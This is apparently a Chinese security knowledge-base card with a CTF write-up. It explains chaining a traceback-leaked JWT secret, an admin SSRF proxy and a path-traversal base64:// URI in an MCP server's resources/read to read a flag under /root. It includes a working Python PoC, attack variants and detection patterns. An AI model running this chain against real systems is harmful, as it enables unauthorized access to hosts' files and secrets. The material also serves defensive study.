---
id: ai-security-mcp-security-resources-read-base64-uri-path-traversal
title: MCP resources/read base64:// URI 路径穿越：管理员 SSRF 代理读取 /root 下 flag
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mcp-resources-read-base64-uri-traversal
tags:
- ai-security
- mcp
- ssrf
- path-traversal
- resources-read
- base64-uri
- jwt
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:30+08:00'
  notes: 已对照原文核对：/admin/nettools SSRF、mcp-session-id 建立、base64://tmp/%2e%2e%2f%2e%2e%2froot 穿越与 text 字段 base64 解码均一致；原文 SECRET_KEY 片段写 secretkey 而实际泄露值为 RDbiBrgdR#CrdZVW，存在表述矛盾，已按原文保留；PoC 未在本机执行。
url: /docs/ai-security/mcp-security/ai-security-mcp-security-resources-read-base64-uri-path-traversal/
draft: false
kb_aliases:
- MCP resources/read 路径穿越
- base64:// URI 穿越
- MCP server SSRF
- mcp-session-id 代理
- nettool SSRF MCP
---

## 一句话结论

当 Web 应用提供任意 URL 的 HTTP 代理（SSRF）且后端仅监听 `127.0.0.1` 的 MCP server 时，攻击者可先通过代理建立 `mcp-session-id`、完成 `initialize`，再调用 `resources/read` 并传入 `base64://tmp/%2e%2e%2f%2e%2e%2froot%2f<flag>` 这类带 `../` 的 URI；MCP server 的资源解析未做路径规范化，最终读取 `/root` 下的 flag 并以 base64 返回。

## 原理

- **SSRF 代理入口**：应用的管理接口 `/admin/nettools` 接受 `http_method`、`http_url`、`http_headers`、`http_body`，由服务端代为发起请求；因此可以访问只绑定 `127.0.0.1:9000` 的 MCP server。
- **MCP 会话建立**：MCP Streamable HTTP 需要先 `GET /` 获取 `mcp-session-id` 响应头，再 `POST /?sessionId=<sid>` 发送 `initialize` JSON-RPC，后续请求携带同一 `mcp-session-id`。
- **resources/read 的 URI**：MCP 的 `resources/read` 接受自定义 URI；示例 server 支持 `base64://<path>` 资源，读取文件后 base64 编码返回。URI 中的 `%2e%2e%2f` 解码为 `../`，而 server 直接拼接/解析路径，未限制在预期目录内。
- **穿越到 /root**：`base64://tmp/../../root/1ffflllaaaggg` 解析为 `/root/1ffflllaaaggg`，绕过“只能读 tmp”的预期；响应 JSON 的 `text` 字段包含文件内容的 base64，解码即得 flag。
- **前置 JWT 伪造**：管理接口需要管理员 token；应用用 `SECRET_KEY = "secretkey" if len(token) <= 2048 else base64.b64decode(token[:2048])`，超长 token 的前 2048 字节非法 base64 时抛异常并返回完整 traceback，泄露源码中的真实 `SECRET_KEY`，据此伪造 `sub=admin` 的 JWT。
- **危害**：绕过网络隔离读取 MCP server 所在主机上的任意可读文件；若 MCP server 还暴露写资源/工具，可进一步写入或执行。

## 触发条件

- 存在可控制 URL/方法/头/体的服务端 HTTP 代理（SSRF），且能访问本机 MCP 端口。
- MCP server 使用 Streamable HTTP/SSE，会话仅靠 `mcp-session-id`，未额外鉴权。
- MCP server 注册了 `base64://` 或类似文件资源，且路径解析未做 `filepath.Clean`/根目录限制。
- 管理接口的 JWT 密钥可通过错误堆栈、弱密钥或其它方式获得/伪造。
- 目标文件对 MCP server 进程用户可读（如 `/root/flag`）。

## 利用步骤

1. 通过超长非法 token 触发 500，读取 traceback 中的 `SECRET_KEY`，伪造管理员 JWT。
2. 用管理员 token 调用代理接口，`GET http://127.0.0.1:9000/`，从响应头取 `mcp-session-id`。
3. 通过代理向 `http://127.0.0.1:9000/?sessionId=<sid>` POST `initialize`，完成 MCP 握手。
4. 再 POST `resources/read`，`params.uri` 设为 `base64://tmp/%2e%2e%2f%2e%2e%2froot%2f<目标文件>`。
5. 解析响应 JSON 中的 `text` 字段，base64 解码得到文件内容。
6. 若目标路径未知，先用 `base64://tmp/../../root/` 或目录列举资源探测；授权测试只读 flag/标记文件。

## PoC

```python
import requests, json, re, base64, html

TARGET = "http://target"
ADMIN = "Bearer <forged-admin-jwt>"
MCP = "http://127.0.0.1:9000"
H = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}

# 1) 建立 MCP 会话（经 /admin/nettools 代理）
r = requests.post(f"{TARGET}/admin/nettools", headers={"Cookie": f"access_token={ADMIN}"},
                  data={"http_method": "GET", "http_url": f"{MCP}/",
                        "http_headers": json.dumps(H), "http_body": ""}).text
sid = re.search(r"mcp-session-id:\s*([a-f0-9\-]+)", html.unescape(r), re.I).group(1)
url = f"{MCP}/?sessionId={sid}"

# 2) initialize
requests.post(f"{TARGET}/admin/nettools", headers={"Cookie": f"access_token={ADMIN}"},
              data={"http_method": "POST", "http_url": url,
                    "http_headers": json.dumps({**H, "mcp-session-id": sid}),
                    "http_body": json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                                             "params": {"protocolVersion": "2024-11-05",
                                                        "capabilities": {},
                                                        "clientInfo": {"name": "c", "version": "1"}}})})

# 3) 路径穿越读取
uri = "base64://tmp/%2e%2e%2f%2e%2e%2froot%2f1ffflllaaaggg"
res = requests.post(f"{TARGET}/admin/nettools", headers={"Cookie": f"access_token={ADMIN}"},
                    data={"http_method": "POST", "http_url": url,
                          "http_headers": json.dumps({**H, "mcp-session-id": sid}),
                          "http_body": json.dumps({"jsonrpc": "2.0", "id": 1337,
                                                   "method": "resources/read",
                                                   "params": {"uri": uri}})}).text
text = re.search(r'"text"\s*:\s*"([^"]+)"', html.unescape(res)).group(1)
print(base64.b64decode(text).decode())
```

## 变体与关联

- 变体：把 `base64://` 换成 `file://`、`../`、绝对路径或其它资源 scheme；对 URI 解码一次/两次的差异做 fuzz。
- 变体：若 MCP 只暴露 `resources/list`，可先枚举资源 URI，再逐个穿越；若暴露 tools，可尝试工具参数中的路径/命令注入。
- 变体：JWT 密钥也可通过 `kid` 注入、弱口令、`alg=none` 或环境变量泄露获得；本卡的 traceback 泄露只是其中一种。
- 关联：[[ai-security-mcp-security-inspector-cors-stdio-rce]]（MCP Inspector CORS/stdio）、[[ai-security-mcp-registry-jwt-none-tool-code-exec]]（MCP JWT 与工具执行）、[[ai-security-mcp-security-weknora-stdio-command-injection-cve-2026-22688]]（MCP stdio 命令注入）。

## 检测与防御

- MCP server：`resources/read` 的 URI 先解析为绝对路径并 `filepath.Clean`，强制限制在允许根目录内；拒绝 `..`、URL 编码穿越与非常规 scheme。
- 网络：MCP server 不应无条件信任本机代理；管理接口的 SSRF 代理应做目标白名单、方法/头/体限制，禁止访问 loopback/内网。
- 认证：JWT 密钥使用强随机值并通过环境变量/密钥管理注入，错误响应不得返回 traceback/源码行；管理接口加独立鉴权与审计。
- 检测：代理请求中出现 `127.0.0.1`、`mcp-session-id`、`resources/read`、`base64://`、`%2e%2e` 等特征；MCP 日志中出现越界路径或异常 URI scheme。
- 响应：轮换 JWT 密钥，审计 MCP 资源访问日志，检查是否读取了 flag/凭据文件。
